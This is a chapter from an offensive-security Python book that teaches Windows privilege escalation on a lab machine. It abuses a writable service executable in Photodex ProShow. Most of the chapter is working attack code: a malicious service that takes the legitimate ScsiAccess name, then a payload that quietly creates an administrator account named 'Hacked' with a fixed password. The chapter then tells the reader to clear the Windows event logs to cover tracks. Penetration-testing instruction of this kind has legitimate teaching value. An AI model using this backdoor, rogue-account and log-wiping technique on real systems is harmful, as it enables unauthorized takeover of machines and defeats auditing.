<html><head></head><body>
        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Miscellaneous Fun in Windows</h1>
                
            
            <article>
                
<p class="calibre2">In this chapter, we'll mainly focus on exploiting vulnerable software in Windows and proceed to use different techniques within privilege escalation. Subsequently, we'll also create backdoors and cover our tracks. This chapter will give a general idea of how we can leverage the power of a Python script to our advantage.</p>
<p class="calibre2">The following topics will be covered in this chapter:</p>
<ul class="calibre9">
<li class="calibre10">Privilege escalation – weak service file</li>
<li class="calibre10">Privilege escalation <span>–</span> preparing vulnerable software</li>
<li class="calibre10">Privilege escalation <span>–</span> backdooring legitimate windows service</li>
<li class="calibre10">Privilege escalation <span>–</span> creating a new admin account and covering the tracks</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Privilege escalation – weak service file</h1>
                
            
            <article>
                
<p class="calibre2">During a penetration testing phase, you may encounter a standard user where you don't have full privilege to access or modify a filesystem due to the <strong class="calibre4">user access control</strong> (<strong class="calibre4">UAC</strong>) and, each time you try to elevate your privilege, you will be prompted to the window that asks you to enter the administrator password. In this section, we will discuss one of the types of doing a <strong class="calibre4">privilege escalation attack</strong>, where you technically jump from a standard user to an administrator or system privilege. These types of attacks, which we will discuss, are called <strong class="calibre4">privilege escalation via service file permission weakness</strong>. The system will be vulnerable if the location of a service executable file is modifiable by the standard user. Then, it can be overwritten by another malicious executable. We may use this capability to gain system privilege(s) by booting our own executable in place of the service executable. Once the service is started after restarting the system, the replaced executable will run instead of the original service executable. So, in summary, we have a system privilege and we'll run an EXE, which belongs to a vulnerable software. Now, since this software EXE can be written by a standard user and within a standard user profile, we can simply replace it with a malicious EXE.</p>
<p class="calibre2">So, this software EXE can be written or modified by a user space, using a standard user. So, what we can do is, we can simply replace the software EXE with a malicious one. On the next three boots, our EXE is going to take a place and will be executed with the power of system privilege.</p>
<div class="packt_tip">Here is a link on privilege escalation types with brief description for each type:<br class="title-page-name"/>
<a href="https://attack.mitre.org/wiki/Privilege_Escalation" class="calibre6">https://attack.mitre.org/wiki/Privilege_Escalation</a>. If you have some time, I recommend that you read this article.</div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Privilege escalation – preparing vulnerable software</h1>
                
            
            <article>
                
<p class="calibre2">For this demonstration, I will be using a vulnerable software named <strong class="calibre4">Photodex</strong> taken from an Exploit Database website. You can download this software from <a href="https://www.exploit-db.com/exploits/24872/" class="calibre8">https://www.exploit-db.com/exploits/24872/</a>. Once the software is downloaded, install this software on our target machine. Once it's finished, restart the machine.</p>
<p class="calibre2">So now, let's try and create a <kbd class="calibre12">nonadmin</kbd> standard account in our target Windows machine by going to<span class="calibre11"> Control Panel</span> | <span class="calibre11">Add or remove user accounts</span> | <span class="calibre11">Create a new account</span>. Let's call this one <kbd class="calibre12">nonadmin</kbd>. After creating the account log into the <kbd class="calibre12">nonadmin</kbd> account and navigate to the <kbd class="calibre12">Photodex</kbd> directory created while installation at <kbd class="calibre12">C:\</kbd> drive and at the same time, open the <span class="calibre11">Task Manager</span>.</p>
<p class="calibre2">You will be able to see the service name, which gets created by Photodex software, which is <kbd class="calibre12">ScsiAccess</kbd> under the <span class="calibre11">Services</span> tab. To get more information about this service, click on the <span class="calibre11">Services</span> button. In the <span class="calibre11">Services</span> window that opens, find the <kbd class="calibre12">ScsiAccess</kbd>, right-click on it and select <span class="calibre11">Properties</span>, you will be able to find the EXE file path for this service. Go and have a look into that directory, in my case, it is <kbd class="calibre12">C:\Program Files\Photodex\Pro Show Producer\ScsiAccess.exe</kbd>. Find the EXE file and right-click on it; notice that we don't need any admin privilege to <span class="calibre11">Rename</span>, <span class="calibre11">Delete</span>, <span class="calibre11">Copy</span>, or even <span class="calibre11">Cut</span> this file. So, technically, if I rename this file to <kbd class="calibre12">ABC</kbd>, for instance, and then replace a malicious file instead of this one, then we can take advantage of this vulnerability. Let's see what we can do with this vulnerability. In the next section, we will create a new service EXE file purely in Python. Then, we will replace the current one, which is the <kbd class="calibre12">sciaccess.exe</kbd> file and see what privilege we can gain access by doing so.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Privilege escalation – backdooring legitimate windows service</h1>
                
            
            <article>
                
<p class="calibre2">In this section, we will code a malicious service file to replace the legitimate one. Now, in order to replace the service file, our new malicious service file should be able to communicate with Windows service control manager. For instance, when you manually <span class="calibre11">Start</span>, <span class="calibre11">Stop</span>, <span class="calibre11">Pause</span>, or <span class="calibre11">Resume</span> the service, the Windows service control manager will send a signal or order to the EXE service file and in return, the service file should usually obey the service control manager's order. If, for any reason, the service file or the EXE file did not understand that signal, then the service control manager will fail to start the service and you will get an error saying <kbd class="calibre12">The service did not respond to the start or control request in a timely fashion</kbd>.</p>
<p class="calibre2"><span class="calibre11">Now, let's jump to the code:</span></p>
<pre class="packt_figure2"># Python For Offensive PenTest<br class="title-page-name"/><br class="title-page-name"/># Backdooring Legitimate Windows Service<br class="title-page-name"/><br class="title-page-name"/>import servicemanager<br class="title-page-name"/>import win32serviceutil<br class="title-page-name"/>import win32service<br class="title-page-name"/>import win32api<br class="title-page-name"/><br class="title-page-name"/>import os<br class="title-page-name"/>import ctypes<br class="title-page-name"/><br class="title-page-name"/>...<br class="title-page-name"/><br class="title-page-name"/># Part 1 - initializing : in this section we:-<br class="title-page-name"/>if __name__ == '__main__':<br class="title-page-name"/>    <br class="title-page-name"/>    servicemanager.Initialize() # define a listener for win servicemanager<br class="title-page-name"/>    servicemanager.PrepareToHostSingle(Service)<br class="title-page-name"/>    servicemanager.StartServiceCtrlDispatcher()<br class="title-page-name"/>    win32serviceutil.HandleCommandLine(Service) #pass a Service class handler, so whenver we got a signal from the servicemanager we will pass it to the Service class<br class="title-page-name"/><br class="title-page-name"/></pre>
<p class="calibre2">First of all, some part of my code is inherited from a script that I found on ActiveState website. Here, you can find the original one <a href="http://code.activestate.com/recipes/551780/" class="calibre8">http://code.activestate.com/recipes/551780/</a>. The second thing I recommend is to read more about Microsoft service control manager functionality. Here is a good start: <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms685150(v=vs.85).aspx" class="calibre8">https://msdn.microsoft.com/en-us/library/windows/desktop/ms685150(v=vs.85).aspx</a>. Last but not least, <kbd class="calibre12">pywin</kbd> library is a prerequisite library to create a Windows service in Python. You can download it from: <a href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/" class="calibre8">https://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/</a>. Our code can be divided into two sections. The first section is about initializing. In this section, we define a listener for Windows, that is, <kbd class="calibre12">servicemanager</kbd>. Then, we pass a <kbd class="calibre12">Service</kbd> class handler, so, whenever we get a signal from <kbd class="calibre12">servicemanager</kbd>, we will pass it to the <kbd class="calibre12">Service</kbd> class.</p>
<p class="calibre2">Let's move to the second part:</p>
<pre class="packt_figure"># Part 2 - Here (in service class) we define the action to do when we got a service manager signal <br class="title-page-name"/><br class="title-page-name"/>class Service(win32serviceutil.ServiceFramework):<br class="title-page-name"/>    <br class="title-page-name"/>    _svc_name_ = 'ScsiAccess' # specify the service name and the display name - note that the name scsiacces is similar to the original one for photodex vulnerable software<br class="title-page-name"/>    _svc_display_name_ = 'ScsiAccess'<br class="title-page-name"/>    <br class="title-page-name"/>    def __init__(self, *args): # Initialize ServiceFramework and we define in functions style what to do when we got a service manager signal<br class="title-page-name"/>        win32serviceutil.ServiceFramework.__init__(self, *args)<br class="title-page-name"/>                <br class="title-page-name"/>    def sleep(self, sec): # if the service manager signal was pause - then we sleep for an amount of seconds<br class="title-page-name"/>        win32api.Sleep(sec*1000, True)<br class="title-page-name"/>        <br class="title-page-name"/>    def SvcDoRun(self): # if the signal was start - then:-<br class="title-page-name"/><br class="title-page-name"/>        self.ReportServiceStatus(win32service.SERVICE_START_PENDING) # tell the Service Manager that we are planning to run the service via reporting back a start pending status<br class="title-page-name"/>        try:<br class="title-page-name"/>            self.ReportServiceStatus(win32service.SERVICE_RUNNING) #tell the Service Manager that we are currently running up the service then call the start<br class="title-page-name"/>                                                                   #function (start) if any exception happened, we will call the stop function (SvcStop)<br class="title-page-name"/>            self.start() <br class="title-page-name"/>           <br class="title-page-name"/>        except Exception, x:<br class="title-page-name"/>            self.SvcStop()<br class="title-page-name"/>               <br class="title-page-name"/>    def SvcStop(self):<br class="title-page-name"/>        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING) #tell the Service Manager that we are planning to stop the serivce<br class="title-page-name"/>        self.stop()<br class="title-page-name"/>        self.ReportServiceStatus(win32service.SERVICE_STOPPED) #tell the Service Manager that we are currently stopping the service<br class="title-page-name"/>        <br class="title-page-name"/>    def start(self):<br class="title-page-name"/>        self.runflag=True # mark a service status flag as True and we will Wait in while loop for receiving service stop signal from the service manager<br class="title-page-name"/><br class="title-page-name"/>        '''<br class="title-page-name"/>        This little code is to double check if we got an admin priv, after replacing our malicious service, thanks to IsUserAnAdmin function<br class="title-page-name"/>        https://msdn.microsoft.com/en-us/library/windows/desktop/bb776463(v=vs.85).aspx<br class="title-page-name"/><br class="title-page-name"/>        f = open('C:/Users/nonadmin/Desktop/priv.txt','w')<br class="title-page-name"/>        if ctypes.windll.shell32.IsUserAnAdmin() == 0:<br class="title-page-name"/>            f.write('[-] We are NOT admin! ')<br class="title-page-name"/>        else:<br class="title-page-name"/>            f.write('[+] We are admin :)')<br class="title-page-name"/>        f.close()<br class="title-page-name"/>        '''<br class="title-page-name"/>               <br class="title-page-name"/>        while self.runflag: # Wait for service stop signal<br class="title-page-name"/>            self.sleep(10)<br class="title-page-name"/>                <br class="title-page-name"/>    def stop(self): # now within the stop function we mark the service status flag as False to break the while loop in the start function<br class="title-page-name"/>         self.runflag=False</pre>
<p class="calibre2">In the second section, we define the action to do when we get a service manager signal and this will happen within the <kbd class="calibre12">Service</kbd> class. In the first two lines, we specify the service name and the display name. Note that the name that I have chosen, which is <kbd class="calibre12">ScsiAccess</kbd>, is similar to the original one for Photodex software. So, if we open the service from the <span class="calibre11">Windows Task Manager</span>, like we did in the previous section, the name exactly matches the service name for the vulnerable software.</p>
<p class="calibre2">Next, we initialize the <kbd class="calibre12">ServiceFramework</kbd> and define in functions style what to do when we get a service manager signal. So, for example, if the service manager signal was pause, then we will <kbd class="calibre12">sleep</kbd> for <kbd class="calibre12">Sleep(sec*1000, True)</kbd> time of seconds. Also, if the signal was start, then we will tell the service manager that we are planning to run the service; this will happen via reporting back a <kbd class="calibre12">SERVICE_START_PENDING</kbd> status through <kbd class="calibre12">ReportServiceStatus()</kbd>. Then, within an exception handling, we will tell the service manager that we are currently running up the service and we will call the <kbd class="calibre12">start()</kbd> function. If any exception happened, then we will call the <kbd class="calibre12">SvcStop()</kbd> function here.</p>
<p class="calibre2">Once we execute the <kbd class="calibre12">start()</kbd> function, we mark the <kbd class="calibre12">ServiceStatus</kbd> flag as <kbd class="calibre12">True</kbd> and we will wait in a while loop for receiving a service stop signal from the service manager. If we get this signal, we move to <kbd class="calibre12">stop()</kbd> function, which will eventually switch the flag to <kbd class="calibre12">False</kbd>. Now, inside the <kbd class="calibre12">stop()</kbd> function, we will do a similar procedure to what we did in the <kbd class="calibre12">start()</kbd> function. So, we will tell the service manager that we are planning to stop the service then, we will execute the <kbd class="calibre12">stop()</kbd> function and finally we will tell the service manager that we are currently stopping the service. Now, within the <kbd class="calibre12">stop()</kbd> function, we mark the service status flag as <kbd class="calibre12">False</kbd> to break the infinite loop in the <kbd class="calibre12">start()</kbd> function. Now, if I export this script into EXE and replace it instead of the <kbd class="calibre12">sciaccess.exe</kbd> and restart the machine, it should work fine. However, I want to go an extra mile and to prove that we got system privilege. So, let's make sure that the exploitation worked fine. For this purpose, I made a quick Python script to check whether we are running as admin or not:</p>
<pre class="packt_figure2"># Are we Admin<br class="title-page-name"/><br class="title-page-name"/>import ctypes<br class="title-page-name"/><br class="title-page-name"/>if ctypes.windll.shell32.IsUserAnAdmin() == 0:<br class="title-page-name"/>    print '[-] We are NOT admin! '<br class="title-page-name"/>else:<br class="title-page-name"/>    print '[+] We are admin :) '</pre>
<p class="calibre2">This script will simply call the <kbd class="calibre12">IsUserAnAdmin()</kbd> function from Windows. If the returned value is <kbd class="calibre12">0</kbd>, it means that we are a standard user; otherwise, it means that we have admin privileges. To run this script, open Command Prompt as administrator and navigate to the <kbd class="calibre12">Desktop</kbd> then <kbd class="calibre12">Users</kbd> and type <kbd class="calibre12">python "Are we Admin.py"</kbd>. We'll get <kbd class="calibre12">[+] We are admin :)</kbd> as we are having admin privilege. This is because before initiating the Command Prompt, I did a right-click and selected <span class="calibre11">Run as administrator</span>.</p>
<p class="calibre2">So, I'm going to use this little trick in our code, and I will inject the check admin script within our malicious service. Obviously, it should be executed once the service gets started, so it should be under the <kbd class="calibre12">start()</kbd> function. Once we run the service, we will create a text file on the desktop and inside that text file we will see what privilege are we running into.</p>
<p class="calibre2">So, we will now export the script into EXE like we did in the previous chapter, and at this point, all we have to do is to replace the original EXE file with the generated one. Go to the original one of the Photodex software. Since the software is vulnerable, we will be able to replace this one. So, I'm going to rename this one to <kbd class="calibre12">access2</kbd> and I will simply copy and paste our malicious file here. If everything is working fine our service should run without any error and we should see a text file on the desktop and once we open it, should tell us the privilege that we run into. After restarting, you'll notice a <kbd class="calibre12">priv</kbd> text file<span class="calibre11"> on the desktop.</span> If you open it, you'll see a text that says we are running as an administrator.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Privilege escalation – creating a new admin account and covering the tracks</h1>
                
            
            <article>
                
<p class="calibre2">In our previous section, we created a malicious Python service and replaced the legitimate one with it. Once the system has started, we verified that we get a system or admin privilege. Now, in this section, we'll see how we can create a new admin account and then jump from the standard user to the admin account. So, what I have changed on the coding part is adding the following section to the previous code, which in summary will create a new admin account once the service gets started:</p>
<pre class="packt_figure2">...       <br class="title-page-name"/><br class="title-page-name"/> USER = "Hacked"<br class="title-page-name"/>        GROUP = "Administrators"<br class="title-page-name"/>        user_info = dict ( # create a user info profile in a dictionary format<br class="title-page-name"/>               name = USER,<br class="title-page-name"/>               password = "python_is_my_life", # Define the password for the 'hacked' username<br class="title-page-name"/>               priv = win32netcon.USER_PRIV_USER,<br class="title-page-name"/>               home_dir = None,<br class="title-page-name"/>               comment = None,<br class="title-page-name"/>               flags = win32netcon.UF_SCRIPT,<br class="title-page-name"/>               script_path = None<br class="title-page-name"/>                )<br class="title-page-name"/><br class="title-page-name"/>        user_group_info = dict ( # create a group info profile in a dictionary format<br class="title-page-name"/>            domainandname = USER<br class="title-page-name"/>           )<br class="title-page-name"/><br class="title-page-name"/>        try:<br class="title-page-name"/>            win32net.NetUserAdd (None, 1, user_info)<br class="title-page-name"/>            win32net.NetLocalGroupAddMembers (None, GROUP, 3, [user_group_info])<br class="title-page-name"/>        except Exception, x:<br class="title-page-name"/>            pass<br class="title-page-name"/><br class="title-page-name"/>...</pre>
<p class="calibre2">So, keep in mind that I have added the aforementioned section under the <kbd class="calibre12">start()</kbd> function. So here, we defined the new username called <kbd class="calibre12">Hacked</kbd>, and the group that it belongs to, which is <kbd class="calibre12">Administrators</kbd> group. Next, we create a user and the group information profile in a dictionary format. Then, inside the dictionary, we specify some values, such as <kbd class="calibre12">password</kbd>, <kbd class="calibre12">priv</kbd>, and <kbd class="calibre12">home_dir</kbd>. Finally, we create the new admin account and add it as a group member to the <kbd class="calibre12">Administrators</kbd> group. In case any exception happened during the creation phase, we will simply skip it. Now, before exporting the code into EXE and test, quickly verify the usernames that we got on the machine by running <kbd class="calibre12">net users</kbd> in Command Prompt and it will list the users in our machine.</p>
<p class="calibre2">Currently, we are logged into the <kbd class="calibre12">nonadmin</kbd> account. So, let's go ahead and do the EXE exporting here. Copy the script into the <kbd class="calibre12">Toexe</kbd> folder and rename it to <kbd class="calibre12">sciaccess</kbd>. Now, run the setup file. Then, copy the exported EXE file to replace our vulnerable software in the <kbd class="calibre12">Photodex\ProShow Producer</kbd> folder. At this point, if everything is working fine, then after a restart, we should see a new admin account listed called <kbd class="calibre12">Hacked</kbd>. Now, restart the machine and log into the <kbd class="calibre12">nonadmin</kbd> account. Fire up the Command Prompt. Now, if we type <kbd class="calibre12">net users</kbd>, we will get a new username called <kbd class="calibre12">Hacked</kbd>.</p>
<p class="calibre2">If we type <kbd class="calibre12">net users Hacked</kbd>, we'll see at the bottom that we belong to the <kbd class="calibre12">Administrators</kbd> group. So, at this point, once we get admin privilege, we can do whatever we want. So, let's go evil and clear the Windows event logs from the <span class="calibre11">Event Viewer</span> by logging in with the Hacked admin account. This will help us cover our tracks.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Summary</h1>
                
            
            <article>
                
<p class="calibre2">In this chapter, we've learned the different ways to execute privilege escalation and exploit the vulnerabilities. We started with exporting a file to EXE and then moved to target a vulnerable software. After this, we initiated backdoor creation and subsequently covered our tracks to avoid detection.</p>
<p class="calibre2">In the next chapter, we'll deal with different types of encryption algorithms.</p>


            </article>

            
        </section>
    </body></html>